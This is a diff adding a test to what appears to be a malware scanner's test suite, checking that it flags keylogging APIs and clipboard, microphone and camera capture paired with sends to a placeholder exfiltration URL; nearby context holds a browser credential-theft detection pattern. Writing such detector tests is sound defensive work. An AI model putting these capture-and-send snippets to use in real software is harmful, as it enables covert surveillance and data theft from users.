@@ -31,6 +31,18 @@ test('detects high-confidence exploit, obfuscation, spyware, and secret indicato
   assert.equal(findingsForText('const encoded = Buffer.from(data).toString("base64");').length, 0);
 });
 
+test('detects expanded keylogging APIs and clipboard/microphone/camera exfiltration', () => {
+  const samples = [
+    'RegisterRawInputDevices(devices); fetch(exfilUrl, { body: captured })',
+    'CGEventTapCreate(kCGSessionEventTap, ...); socket.send(keys)',
+    'navigator.clipboard.readText().then((text) => fetch(url, { body: text }))',
+    "pyperclip.paste(); requests.post(url, data=clip)",
+    "navigator.mediaDevices.getUserMedia({ audio: true }).then((s) => fetch(url, { body: s }))",
+    'sounddevice.rec(seconds); requests.post(exfil, data=audio)',
+  ];
+  for (const sample of samples) assert.ok(findingsForText(sample).length, sample);
+});
+
 test('does not execute or flag inert regular-expression rule definitions', () => {
   const scannerRule = "{ pattern: /Login Data.{0,20}dpapi/i, message: 'credential detector' },";
   assert.equal(findingsForText(scannerRule).length, 0);
